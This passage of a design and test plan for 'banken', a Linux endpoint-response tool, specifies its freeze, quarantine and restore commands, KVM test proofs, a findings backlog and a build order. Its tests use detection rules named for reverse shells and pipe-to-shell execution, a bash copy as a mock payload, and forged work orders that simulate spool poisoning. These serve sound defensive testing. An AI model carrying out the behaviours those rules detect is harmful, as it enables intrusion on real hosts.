   where `dest` is `origPath` or `-to PATH`. `-to` must be absolute, under `allowPaths`, outside
   never-touch, and not under the store or the ledger dir; it is a path the operator typed, checked
   with the same functions the executor uses. A squatter at `dest` fails with `EEXIST: <dest> is
   occupied; move it aside or use -to`; no `-force` is offered. On failure after the immutable bit
   was cleared, re-set it (the stored artifact stays inert).
3. `neuter`: open `origPath` `O_PATH|O_NOFOLLOW`, `fstat`, require `(dev, ino)` equal the manifest
   (Q4: a weak neuter's path may be a different file by now; refuse with `inode replaced`), then
   clear immutable and `fchmod` the recorded mode **on the fd** (Q1's discipline applied to the
   reverse direction too), `fstat` again and confirm.
4. Write `restored.json` (time, operator uid, destination, the checks that passed) and **keep the
   manifest and the directory** (Q3). Ledger `restored`.

The round-trip property the proof asserts: these are identical to the pre-quarantine values:

- content
- mode (including setuid/setgid/sticky)
- uid
- gid
- mtime
- `user.*` xattrs

`ino` is unchanged too: rename keeps the inode, and neuter never left it.

### 3.5 `drain`

It is documented in section 2.4. It is listed here because it is a subcommand of the same
dispatch. It is not for operators to run by hand, except in a test or to re-run recovery. `banken
respond drain` with an empty spool runs the recovery pass and exits 0.

---

## 4. Enforcement proofs under KVM: freeze and quarantine

Same shape as `tests/response-enforce.nix`:

- a throwaway VM with `response.enforce = true`
- a policy that maps named rules to the action under test
- victims the test spawns as `alice`
- one audit barrier, one scan
- then assertions on the live system and the ledger

Same honesty. Every victim is self-spawned. Nothing real is touched. The real host stays unarmed.
Both new tests register in `flake.nix` `checks.x86_64-linux` as `response-freeze` and
`response-quarantine`. They run with `nix-build tests/<name>.nix` on hokkaido (KVM).

### 4.1 Harness changes (`tests/lib/enforce-spawn.nix`)

- `enf_scan()`: `systemctl start banken.service`, then `wait_until_succeeds` on "the spool is
  empty and `banken-respond.service` is inactive". Every call site of the bare `systemctl start`
  in the enforce and whack-a-mole tests switches to it. Without the wait, both existing proofs
  would read the ledger before the helper has acted.
- a heartbeat carrier: `carrier: "beat"` is the shell carrier whose stay-alive tail is
  `while :; do echo . >> /tmp/hb_<name>; sleep 0.01; done` instead of `sleep 100000 ; :`. The
  file's size is the ground truth for "making progress": it grows, or it does not. The `sleep`
  forks a child every 10 ms, which is exactly the fork-during-migration shape `scope: tree` must
  catch. The loop is frozen the instant the shell is. An already-forked `sleep` finishes on its
  own and exits, which is correct and recorded.
- `enf_tree(name, ...)`: a shell victim that also starts a long `sleep` child and records both
  pids, for tree assertions.
- `enf_order(alert_json, decision_json)`: writes a hand-crafted work order into
  `/var/lib/banken/spool/` as root (tmp + rename, like the daemon), returns its id. This is how the
  proofs exercise the helper's own rails without needing an audit event that would name a device
  node or a forged rule. The order IS the forged input.
- `hb_size(name)`, `hb_stalled(name, settle_ms, window_ms)`: read the size, wait the settle (so
  in-flight writes from a `sleep` that was mid-exit land), read again, wait the window, compare.
  `settle_ms = 200`, `window_ms = 1000`. Both are named constants in the harness with this
  sentence beside them.

### 4.2 The boundary phase (added to `tests/response-enforce.nix`)

Cheap assertions that the split is real, run once before the scorecard:

- `systemctl show -p CapabilityBoundingSet banken.service` is exactly `cap_dac_read_search`.
  `systemctl show -p ProtectProc banken.service` is `invisible`. The same for
  `banken-respond.service` lists the section 2.1 set and `default`.
- a forged order (via `enf_order`) asking `kill` for the innocent's pid under a rule name the
  policy does not map -> ledger `downgraded`, innocent alive. A second forged order asking `kill`
  for the innocent under a mapped rule but with `image: /nix/store/.../bash` -> the helper's
  `Decide` passes (the image is not a protected name) and `identify()` refuses with
  `ErrStaleTarget: live exe != image` -> innocent alive. These are the spool-poisoning tests
  `enforcement-testing.md` 4.8 called the single most important protocol test.
- the daemon unit cannot write a cgroup. `systemd-run --wait -p ProtectControlGroups=yes` is not
  needed: the rendered property is asserted above, and `tests/vm.nix`'s module eval test asserts
  the unit is byte-identical with enforce on and off.

### 4.3 `tests/response-freeze.nix`

Policy:

- `reverse_shell -> freeze (scope: tree)`
- `pipe_to_shell -> kill (scope: tree)`
- an entry mapping `timestomp -> none`
- `minLevel: high`
- `allowRoot: false`
- generous rate limits

Victims:

- `V` = beat carrier tripping `reverse_shell` plus a long `sleep` child (tree of two)
- `I` = beat carrier tripping nothing (the innocent, must keep beating)
- `N` = a victim tripping `timestomp` (maps to none, must be untouched)
- `K` = tree victim tripping `pipe_to_shell`

Before the scan, do two things:

- record `/proc/<pid>/cgroup` for every pid of `V` (the `orig` the thaw must restore)
- stop `banken-respond.path` so the scan's orders sit in the spool

Phase A, the freeze lands and really stops the tree:

- `enf_scan` after copying `V`'s order out of the spool to `/root/order-V.json` and restarting the
  path unit (the copy is for phase B).
- ledger: `executed`, `action: freeze`, `enforced: true`, `handle.dryRun: false`, `handle.method:
  cgroup`; take `H = handle.id`.
- `/sys/fs/cgroup/banken.quarantine/H/cgroup.events` contains `frozen 1`; `cgroup.procs` contains
  both of `V`'s pids and no other pid; `/proc/<V>/cgroup` now points into `H`.
- `hb_stalled("V")` is true; `hb_stalled("I")` is false (the innocent beats on).
- `/var/lib/banken/freeze/H/manifest.json`: `state: frozen`, `method: cgroup`, `order` equals the
  decision id, `pids` equals the two recorded pids, `orig[pid]` equals the pre-scan read for each.
- `N` is alive, beating if it beats, and has no action line; `I` has no action line.

Phase B, idempotency and replay (F7 and the "drain of the same order" invariant):

- `enf_order` with the contents of `/root/order-V.json` under a new filename; wait for the drain.
- exactly one directory under `banken.quarantine/`; exactly one entry under `freeze/`; the new
  action line is `already-applied` with `handle.id == H`.
- a *fresh* alert for the same tree cannot be produced (it is frozen), so the direct
  `Freeze`-twice case is the unit test `TestFreezeIdempotent`; the VM proves the drain-level
  idempotency that the unit test cannot.

Phase C, thaw reverses it exactly:

- `banken respond thaw H` exits 0 and prints one `moved-home` line per pid.
- `/proc/<pid>/cgroup` equals the pre-scan read for both pids; `banken.quarantine/H` is gone;
  `freeze/H/thawed.json` exists; ledger has `thawed` with `decisionId` set.
- `hb_stalled("V")` is false: the heartbeat grows again (the tree resumed).
- `banken respond thaw H` again exits 0 with `already thawed`; `banken respond thaw 0000deadbeef`
  exits 1. `banken respond list -kind freeze` shows `H thawed`.

Phase D, tree kill leaves no cgroup behind (F8):

- `K`'s order is drained in phase A's scan too (same scan). Assert both of `K`'s pids are dead,
  the ledger method is `cgroup-kill`, and after the drain `ls /sys/fs/cgroup/banken.quarantine/`
  shows only `H` (then nothing after phase C). Then spawn ten more `K`-shaped trees, scan, and
  assert the directory is empty: ten EBUSY opportunities, zero leaks.

Phase E, collateral. `I` and `N` are alive at the end, with no action lines for either. The
scorecard prints `freeze proven: tree frozen, heartbeat stalled, thaw restored cgroups and
progress; 0 innocents touched; 0 cgroup dirs leaked over 11 tree kills`.

What the VM does not prove here, and the unit tests do:

- `TestFreezeIdempotent` (two `Freeze` calls on one live tree return one handle)
- `TestThawTwice`
- `TestFreezeManifestFirst` (store dir unwritable -> no migration happens)
- the SIGSTOP fallback (`TestFreezeThawSigstop` exists)
- `TestKillTreeWaitsForPopulatedZero` with a child that exits slowly

### 4.4 `tests/response-quarantine.nix`

Policy:

- `exec_from_tmp -> quarantine (target: image)`
- `quarantine.allowPaths` at the default
- `quarantine.maxFileBytes: 1048576` (1 MiB, so the sparse-file phase is quick and the cap is
  visibly exercised)
- `minLevel: high`
- `allowRoot: false`

Why `target: image` and a transient dropper? On the auditd floor an execve event carries no
`TargetFilename` (`internal/parser/auditd.go` sets it only for non-exec PATH records, by design).
So the one file an exec alert names is its own image. A victim that executes a payload from scratch
and **exits** is the dropper story `quarantine.md` section 1 tells. The process is gone at drain
time (`ErrGone` would be the process outcome), and the file is what is left to act on. It also
sidesteps the in-use rail (Q5, not in this plan) honestly, rather than by setting `inUse: proceed`.

Fixtures the test prepares as `alice`:

- `P1 = /tmp/q/payload` (a copy of `bash`, mode `0755`, `mtime` set to a known value with
  `touch -d`, a `user.banken-test` xattr set with `setfattr`, the `attr` package in the VM)
- `S1 = /tmp/q/innocent` beside it (the sibling that must not change)
- `P2 = /dev/shm/q/payload` and `S2 = /dev/shm/q/innocent`, the same on tmpfs
- `F = /tmp/q/fifo` (`mkfifo`)
- `L = /tmp/q/link -> /home/alice/secret`
- `B = /tmp/q/big`, a 2 GiB sparse file (`truncate -s 2G`)

`/tmp` in the NixOS test VM is on the root filesystem (same device as `/var/lib`), and `/dev/shm`
is tmpfs. So the two payloads take the rename and the neuter paths with no test-specific mount
tricks. The test asserts `stat -c %d` differs between `/dev/shm/q` and `/var/lib/banken` before
relying on it.

Before the scan, record for `P1` and `P2`: `sha256sum`, `stat -c '%i %f %u %g %Y %h'`, the xattr.

Phase A, rename quarantine (same filesystem):

- `runuser -u alice -- /tmp/q/payload -c true` (exits); barrier; `enf_scan`.
- ledger `executed`, `action: quarantine`, `handle.method: rename`; `Q1 = handle.id`.
- `/tmp/q/payload` is absent; `/tmp/q/innocent` unchanged (mode, content, inode).
- `/var/lib/banken/quarantine/Q1/file` has the recorded inode (`stat -c %i` equal), mode `0000`,
  `lsattr` shows `i`; `manifest.json` is `0400` with `i`, and its `method`, `origPath`, `stat.ino`,
  `stat.dev`, `sha256`, `order` fields equal the recorded values and the decision id.
- `banken respond list -kind quarantine` shows `Q1 held sha256 ok`.

Phase B, EXDEV neuter in place (tmpfs), the Q1 end-to-end check:

- `runuser -u alice -- /dev/shm/q/payload -c true`; barrier; `enf_scan`.
- ledger `handle.method: neuter`; `Q2 = handle.id`; no `file` in the store entry.
- `/dev/shm/q/payload` still exists, `stat -c %i` equals the manifest's `stat.ino` (the neutered
  inode is the fstat'd inode, not a re-resolved path), mode `0000`, `lsattr` shows `i`
  (tmpfs honours `FS_IOC_SETFLAGS` since Linux 6.0; NixOS 26.05's kernel qualifies; the manifest
  says `immutable: true` and the test asserts it rather than assuming it).
- `/dev/shm/q/innocent` unchanged. `runuser -u alice -- rm /dev/shm/q/payload` fails (EPERM: the
  owner cannot delete an immutable file); `runuser -u alice -- chmod 755 /dev/shm/q/payload`
  fails. This is the difference between a quarantine and a `neuter-weak`.

Phase C, restore round-trips byte-identical:

- `banken respond restore Q1` exits 0. `/tmp/q/payload` exists; `sha256sum` equal; `stat`
  fields (`%i %f %u %g %Y %h`) equal the pre-quarantine record; the xattr is back; `lsattr` shows
  no `i`; `runuser -u alice -- /tmp/q/payload -c true` runs (it is executable again).
- `quarantine/Q1/` still holds `manifest.json` and now `restored.json` (Q3); ledger `restored`.
- `banken respond restore Q1` again exits 0 with `already restored`.
- `banken respond restore Q2` exits 0: `/dev/shm/q/payload` mode `0755`, no `i`, same inode,
  `sha256sum` equal; `restored.json` present. The Q4 check is exercised negatively in phase D.

Phase D, restore refuses to clobber, and `-to`:

- quarantine `P1` again (phase A's recipe; `Q3`). As `alice`, create a new `/tmp/q/payload`
  (`echo squatter >`). `banken respond restore Q3` exits 1 with `occupied`; the squatter's content
  is `squatter`; `quarantine/Q3/file` still has the stored inode. `banken respond restore Q3 -to
  /tmp/q/payload.restored` exits 0 and the file is there with the original hash. `-to /etc/x`
  and `-to /var/lib/banken/quarantine/x` exit 1 (never-touch; the store).
- for Q4: quarantine `P2` again (`Q4`), then as root replace the neutered inode (`chattr -i`, `rm`,
  recreate the path with other content). `banken respond restore Q4` exits 1 with `inode
  replaced`; the new file is untouched (mode and content as created). The ledger records the
  refusal.

Phase E, the guards, via forged orders. Each `enf_order` carries an `exec_from_tmp` alert whose
`image` is the path under test, so the helper's `Decide` and the executor both see it.

- `image: /dev/null` -> `downgraded` (the helper's `Decide` says `untargetable: under never-touch
  /dev`, Q14) and `/dev/null` is still a character device with mode `0666`. A second forged order
  for `/dev/shm/q/innocent` is NOT refused by the never-touch rail (the `/dev/shm` carve-out)
  and proceeds to quarantine it normally (then `restore`d, so the file is back for the collateral
  check). The executor's own copy of the guard is a unit test (`TestQuarantineRefusesDevNode`
  calls `Quarantine` directly with `/dev/null`, bypassing `Decide`).
- `image: /tmp/q/fifo` -> `failed: not a regular file`; the FIFO is intact.
- `image: /tmp/q/link` -> `failed` from the `O_NOFOLLOW` open (`ELOOP`); `/home/alice/secret`
  unchanged.
- `image: /etc/passwd` -> `downgraded` (never-touch), untouched.
- `image: /tmp/q/big` (2 GiB sparse, cap 1 MiB) -> `executed`, `method: rename`, manifest `sha256:
  "unhashed: 2147483648"` (Q6), and the drain's wall time for that order under 5 s (a soft print,
  not an assertion; the hard assertion is the manifest field and that the file moved).
- an order whose alert carries a rule the policy does not map -> `downgraded`, nothing moved.

Phase F, manifest-first (Q2) end to end:

- `chattr +i /var/lib/banken/quarantine` (the store root; root can set it, and the helper never
  modifies the root dir's flags). Quarantine `P1` (recipe of phase A). Ledger `failed` with the
  `mkdir`/manifest error; `/tmp/q/payload` still present with the original inode and mode; no new
  entry under the store. `chattr -i`, re-run the drain by hand (`banken respond drain`) with the
  order copied back in, and it succeeds. The crash-injection variant (exit between the rename and
  the finalise, then recover from `pending`) is the unit test `TestQuarantineRecoverPending`.

Phase G, collateral and the scorecard. `S1`, `S2`, `F`, `L`'s target and `/dev/null` are
unchanged. No action line names any of them, except the deliberate `S2` round trip in phase E,
which is asserted restored. Print `quarantine proven: rename and neuter landed on the fstat'd
inode, store neutered, manifest-first held under an unwritable store, restore round-tripped
byte-identical and refused to clobber; guards held for /dev, FIFO, symlink, /etc, 2 GiB sparse`.

### 4.5 What the VM proofs leave to unit tests, said plainly

- the fstat-to-rename and fstat-to-neuter swap race (Q1's actual race) needs a hook between the
  steps. `TestQuarantineSwapRaceRename` and `TestQuarantineSwapRaceNeuter` inject one (a
  package-level `var beforeAct func()` the test sets), swap the directory entry, and assert
  `ErrStaleTarget`, the swapped-in file untouched, and no store entry. The VM asserts the inode
  identity end to end, which is the observable consequence.
- crash injection in the drain (`os.Exit` after the act, before the ledger line, then re-run):
  `TestDrainCrashAfterActIsAlreadyApplied` with a fake executor whose store write is real.
- the `not-armed` rail: fixtures in `decide_test.go`, plus a module eval test that the default
  config renders no helper unit.
- the `allowPaths` subset check at drain startup: `TestDrainRefusesPolicyOutsideSandbox`.

---

## 5. The backlog, mapped

| Finding | Where it lives today | Fix | Stream / build item | Proved by |
| --- | --- | --- | --- | --- |
| F7 freeze not idempotent (`exec_linux.go:254-281`) | `Freeze` always makes a new cgroup and records the first quarantine cgroup as `Orig` | read `/proc/<pid>/cgroup`; under `CgroupRoot` -> return the existing id; freeze manifest written before migration holds `orig`; order id in the manifest -> `already-applied` | item 4 (freeze store) | `TestFreezeIdempotent`; freeze VM phase B |
| F8 cgroup dir leak on EBUSY (`:349`, `:303`) | `os.Remove(cgDir)` right after `cgroup.kill`, error ignored | poll `cgroup.events` for `populated 0` (10 ms steps, 2 s bound: a SIGKILLed task leaves the cgroup within ms; 2 s is two hundred chances), then `rmdir`; if still populated, record `cgroupLeft` on the handle; the drain's recovery pass removes empty dirs with no live manifest | item 4 | `TestKillTreeWaitsForPopulatedZero`; freeze VM phase D (zero leaks over 11 tree kills) |
| F9 Collect skips identity (`:494-536`) | **closed in this tree**: `Collect` calls `identify()` and holds the pidfd across the snapshot | keep it through the drain port; the evidence manifest gains `order` and is written first like the other stores | item 1 (the drain) | `TestCollectRefusesStaleTarget` (exists); drain unit test that a stale collect is `failed: stale` |
| Q1 EXDEV neuter by path (`:439-440`, `:677`) | `os.Chmod(path, 0)` and `chattr(path)` re-resolve the name | `fchmod` and `FS_IOC_SETFLAGS` on an `O_RDONLY` fd opened via `/proc/self/fd/<opath>` (same inode by construction); post-neuter `fstat` recheck of `(dev, ino)` and `mode == 0`; `chattr` takes an fd | item 5 (quarantine fixes) | `TestQuarantineSwapRaceNeuter`; quarantine VM phase B (inode identity) |
| Q2 manifest after rename (`:446-448`) | manifest write is after the act and a failure is a warning | write `method: pending` manifest, `fsync`, then act, then finalise (`0400` + immutable); the drain's recovery pass finishes or rolls back `pending` | item 5 | `TestQuarantineManifestFirst`, `TestQuarantineRecoverPending`; quarantine VM phase F |
| Q3 Restore destroys evidence (`:476`, `:485`) | `os.RemoveAll(entryDir)` | keep the entry; write `restored.json`; a second restore is a no-op by the tombstone | item 7 (`restore`) | `TestRestoreTwice`; quarantine VM phase C |
| Q4 restore checks `ino` only / neuter restore checks nothing (`:470`, `:478-486`) | `dst.Ino != man.Stat.Ino`; neuter path chmods by name | `(dev, ino)` on both methods; neuter restore opens `O_PATH|O_NOFOLLOW`, `fstat`, compares, acts on the fd | item 7 | `TestRestoreRefusesReplacedInode`; quarantine VM phase D |
| Q6 sha256 has no size cap (`:407`, `:864`) | `io.Copy` over the whole file, dry-run included | `quarantine.maxFileBytes` (policy, default 256 MiB per `quarantine.md` 3.2): over the cap, `sha256: "unhashed: <size>"`, the file is still taken; `list`'s re-hash honours the same cap | item 5 | `TestQuarantineUnhashedOverCap` (sparse 1 TiB); quarantine VM phase E |
| Q14 `/dev` not in never-touch (`:52`, `policy.go:105`) | a device node is caught only by the `S_IFREG` check | add `/dev` to the one shared never-touch list with a `/dev/shm` carve-out, in `internal/response` (exported) and used by `exec`; the intent is in the list, not in a side effect of `fstat` | item 3 (shared lists) | `TestNeverTouchDevWithShmCarveOut`, `TestQuarantineRefusesDevNode`; quarantine VM phase E |

Not in this plan, named so nobody looks for them here:

- Q5 (owner / root-owned / in-use rails)
- Q7 (already covered by the store neutering in item 5's manifest finalise)
- Q8 (manifest fields beyond what the proofs need)
- Q9 (YARA)
- Q10/F12 (composites)
- Q11 is this doc's section 3 minus `purge` and `show` (`show` is `explain -json`; `purge` waits
  for Q9)
- Q12/Q13 (emulation keep mode)
- F1-F6 and F10-F11 (`enforcement-testing.md` owns them; F1-F3 are closed in this tree and the
  existing whack-a-mole and enforce proofs keep them closed through the split)

---

## 6. Build sequence

The order follows a few rules:

- the split lands first (items 1-2 ship together as one PR; the second is the module half of the
  first)
- the shared lists land before the stores that use them
- each F/Q fix lands with the code the matching proof then verifies
- the read-only CLI lands before the privileged one
- the proofs land last, against a shape that no longer moves

Every item is one worker brief: its goal, its files, what to prove, and what it closes. A worker
keeps its own Taskwarrior list per the house rule.

1. **The spool, the work order, the drain, and the `not-armed` rail.** Goal: the daemon stops
   calling the executor; a work order is the only way an action reaches a primitive. Files:
   `internal/response/{types.go,decide.go,spool.go,order.go}`, `internal/response/respond/responder.go`
   (drop `exec`, take a `*Spool`), new `internal/response/drain/`, top-level `respond.go` with the
   `drain` subcommand, `main.go` (`case "respond"`, `setupResponder` builds the spool),
   `internal/config/config.go` (`Spool.MaxAge`, `QuarantineAllowPaths`), the action ledger line gains
   `live` and the new phases (`expired`, `downgraded`, `already-applied`, `recovered`, `thawed`,
   `restored`). Prove: `go test ./...` on the Mac; `decide_test.go` fixtures for `not-armed` (armed
   false under `mode: enforce` is `rail: not-armed`, no order); `respond` tests assert a decided
   action writes exactly one order via tmp + rename and a ledger failure writes none; `drain` tests
   over a fake executor: expired, kill-switch, malformed, downgraded (a `kill` order under a policy
   mapping the rule to `freeze`; an order for an unmapped rule), already-applied on replay,
   crash-after-act replay, policy-outside-sandbox refused at startup, a stale `collect` is
   `failed: stale` (F9 kept). Closes: F9 (kept closed through the port), the spool-poisoning
   invariant of `enforcement-testing.md` 4.8.

2. **Module wiring for two units, and the existing proofs re-pass.** Goal: `response.enforce`
   emits `banken-respond.{service,path}` with the section 2.1 capability set and leaves
   `banken.service` untouched. Files: `module.nix` (options `response.spool.maxAge`,
   `response.quarantine.allowPaths`; the two units; the daemon unit loses its enforce-conditional
   caps, `ProtectProc` flip and pidfd syscalls; assertions), `tests/lib/enforce-spawn.nix`
   (`enf_scan`, `enf_order`), `tests/response-enforce.nix` and `tests/response-whackamole.nix`
   (switch to `enf_scan`; add the boundary phase of section 4.2 to the enforce test), `tests/vm.nix`
   (module eval: default config renders no helper; the daemon unit is identical with enforce on and
   off), `README.md` security-model item for the split. Prove: both existing KVM proofs PASS on
   hokkaido with the kill now landing from `banken-respond.service` (the ledger's executed line is
   written by the helper; `journalctl -u banken-respond` shows it); the boundary phase PASSes
   (`CapabilityBoundingSet` of each unit as specified; forged orders downgraded or stale, innocent
   alive). Closes: the "scan unit gains no new privilege" goal of the spec (goal 3) that the
   in-process responder had to violate.

3. **One never-touch list, one deny list, `/dev` with the `/dev/shm` carve-out.** Goal: Q14, and
   no second copy of a safety list to drift. Files: `internal/response/{policy.go,decide.go}` export
   `UnderNeverTouch`, `UnderTrustedExePrefix`, `BuiltinDenyName`, `UnderAllowPaths`;
   `internal/response/exec/exec_linux.go` deletes its copies and calls them; `policy.go` validation
   keeps rejecting an `allowPaths` entry under never-touch while accepting `/dev/shm`. Prove:
   `TestNeverTouchDevWithShmCarveOut` (`/dev/null`, `/dev/sda`, `/dev/shm`, `/dev/shm/x`,
   `/dev/shmx` cases), `TestQuarantineRefusesDevNode` (calls `Quarantine` directly on `/dev/null`:
   `ErrDenied` naming never-touch, before any `S_IFREG` check), the existing exec tests unchanged.
   Closes: Q14.

4. **The freeze store, idempotent freeze, no cgroup leak.** Goal: F7 and F8; `Thaw` works from
   the store alone. Files: `internal/response/exec/exec_linux.go` (`Freeze`: existing-cgroup check,
   manifest-first, `Handle.Undo` = id; `Thaw`: by id, per-pid confirm-then-move, tombstone; `Kill`
   tree: populated-wait then `rmdir`; `Collect`: manifest first), new `exec/store.go` (manifest
   read/write/finalise/tombstone shared by the three stores), `exec.Config` gains `FreezeDir`,
   `internal/response/drain` recovery pass for freeze and empty cgroup dirs. Prove: `TestFreezeIdempotent`
   (two `Freeze` calls, one cgroup, one handle; thaw once returns every pid to its pre-freeze
   cgroup and the heartbeat resumes), `TestThawTwice`, `TestFreezeManifestFirst` (unwritable store
   -> no pid moved), `TestKillTreeWaitsForPopulatedZero` (after 20 tree kills the cgroup root is
   empty), `TestThawSkipsMovedPid`. The cgroup tests need root and cgroup v2 (`t.Skip` otherwise;
   they run in the VM proofs' build or on hokkaido as root). Closes: F7, F8.

5. **Quarantine on the fd, manifest first, hash cap.** Goal: Q1, Q2, Q6 (and Q7's store neutering
   as part of finalise). Files: `exec_linux.go` (`Quarantine`: pending manifest -> `renameat2` ->
   `(dev, ino)` recheck -> `fchmod(0)` + immutable on the stored fd -> finalise; EXDEV branch acts on
   `/proc/self/fd/<opath>` opened `O_RDONLY`, post-neuter `fstat`; `chattr(fd, ...)`; `sha256OfFd`
   bounded by `MaxFileBytes`), `internal/response/policy.go` (`quarantine.maxFileBytes`, default
   268435456 with the sentence "256 MiB: a hash of a larger file costs seconds the drain cannot
   spend; the rename costs nothing, so the file is still taken"), the drain recovery pass for
   `pending`. Prove: `TestQuarantineSwapRaceRename`, `TestQuarantineSwapRaceNeuter` (the hook;
   the swapped-in file untouched), `TestQuarantineManifestFirst`, `TestQuarantineRecoverPending`
   (exit between rename and finalise; recovery finalises; a replay is already-applied),
   `TestQuarantineUnhashedOverCap` (1 TiB sparse: `unhashed`, moved, under one second),
   `TestStoredFileIsNeutered` (`0000` + immutable in the store), the existing `TestQuarantineRestore`
   extended to EXDEV via a tmpfs `t.TempDir()` where available. Closes: Q1, Q2, Q6, Q7.

6. **`banken respond list` and `explain`.** Goal: the read-only operator surface over the ledger
   and the stores. Files: `respond.go` (dispatch, flags, exit codes), new `internal/response/view/`
   (ledger reader by day range and id, store readers, the state computation of section 3.1, the
   chain reconstruction of section 3.2; pure over an `fs` root so it tests on the Mac),
   `exec.Executor.Verify` wired behind `-verify`. Prove: golden tests over a fixture ledger + store
   tree under `tests/respond/` (frozen, thawed, held with `sha256 ok`, held with `CHANGED`, neuter
   `TAMPERED`, `lost (reboot)`, `lost (inode replaced)`, a decided-never-requested chain, a
   downgraded chain); `-json` round-trips the manifest verbatim; unknown id exits 1. Closes: the
   `list`/`show` half of Q11.

7. **`banken respond thaw` and `restore`.** Goal: Q3 and Q4; the undo path from the store. Files:
   `respond.go`, `exec_linux.go` (`Restore`: by id, `(dev, ino)` on both methods, fd-based neuter
   reversal, `-to` checks through the shared list functions, tombstone, keep the entry; `Thaw`
   from item 4 gets its CLI), the ledger's `thawed`/`restored` lines with the operator uid. Prove:
   `TestRestoreTwice`, `TestRestoreRefusesReplacedInode` (both methods), `TestRestoreOccupiedPath`
   (squatter untouched, `-to` works, `-to /etc/x` refused, `-to <store>` refused),
   `TestRestoreRoundTripProperty` (`rapid`: content, mode incl. setuid bits, mtime, `user.*`
   xattrs, `nlink` identical; same-fs and EXDEV), `TestRestoreDryRunHandleSaysSo`. Closes: Q3,
   Q4, the `restore` half of Q11.

8. **`tests/response-freeze.nix`.** Goal: section 4.3 under KVM on hokkaido. Files: the test,
   `tests/lib/enforce-spawn.nix` (beat carrier, `enf_tree`, `hb_*`), `flake.nix` (`response-freeze`
   check). Prove: PASS with the phase A-E assertions; the scorecard line. Verifies: F7 (phase B),
   F8 (phase D), the thaw of item 4/7, the drain replay of item 1.

9. **`tests/response-quarantine.nix`.** Goal: section 4.4 under KVM. Files: the test, `flake.nix`
   (`response-quarantine`), the VM gets `attr` and `e2fsprogs` (`setfattr`, `lsattr`, `chattr`).
   Prove: PASS with phases A-G; the scorecard line. Verifies: Q1 (phase B), Q2 (phase F), Q3 (C),
   Q4 (D), Q6 (E), Q14 (E), the `allowPaths`/`ReadWritePaths` agreement of item 2 (phases A-B
   succeed under the real unit; `/etc/passwd` is refused by code and would be refused by the
   sandbox), the restore semantics of item 7.

10. **The daemon drops root.** Goal: close the uid-0 residual of section 2.1 so the boundary is
    complete. Files: `module.nix` (`User=banken`, `Group=banken`, `AmbientCapabilities=CAP_DAC_READ_SEARCH`,
    `StateDirectory`/`LogsDirectory`/`RuntimeDirectory` ownership, the helper keeps root and reads
    the daemon-owned spool with `CAP_DAC_READ_SEARCH`, unlinks with `CAP_DAC_OVERRIDE`), `tests/vm.nix`
    (the daemon's `Uid` is not 0, `CapEff` is exactly `CAP_DAC_READ_SEARCH`, a scan still reads the
    audit log and the Laurel log, `banken status`/`reload`/the pidfile still work), the distro
    matrix tests (`tests/distros/`), `tests/response-enforce.nix` boundary phase (`User=banken`
    asserted; a forged order from a non-root writer is impossible, so the spool's `0700 banken`
    mode is asserted instead). Prove: `tests/vm.nix`, the distro matrix, and all four response
    proofs PASS. Closes: the residual; after this the README can say the daemon cannot act on any
    process or file.

Not scheduled here, in the order they would come next:

- Q5 (the owner/root-owned/in-use rails, which the proofs' transient dropper deliberately does not
  need)
- the time-to-kill histogram over the spool path (`enforcement-testing.md` 4.1, which now has a
  second hop to measure)
- the weekly observe canary on hokkaido (5.4 layer 3)
- `purge` once YARA writes `yara.json`

---

## 7. Open questions for Conor

1. **Fixed helper capability set vs derived.** Section 2.1 grants the file capabilities to every
   armed host. If you would rather a kill-only policy host never carry `CAP_LINUX_IMMUTABLE`, the
   cleanest knob is `services.banken.response.fileActions = false` (drops the three file caps and
   the `allowPaths` `ReadWritePaths`; the drain then refuses a quarantine entry at startup). One
   option, one line in the table.
2. **Item 10 timing.** The daemon-drops-root change is where the boundary becomes complete, and it
   is the item most likely to surface a hidden root assumption on a distro. Land it right after
   item 2 (so the proofs run against the final shape) or last (so the proofs are not blocked on
   the distro matrix)? This doc puts it last. Say if you want it earlier.
3. **`thaw`/`restore` in-process vs via the spool.** Section 3 argues in-process under the
   operator's root shell. The alternative (an undo order the helper drains) gives one code path
   that ever holds capabilities at the cost of an undo-order type and a wait. The trust model does
   not change either way; this is a shape preference.
4. **`-to` for restore.** Bounded by `allowPaths` as designed. If you want an operator to be able
   to restore into an analysis directory outside `allowPaths` (`/root/cases/`), `/root` is in the
   default list already; the question is whether `-to` should bypass the list at all. This doc says
   no.
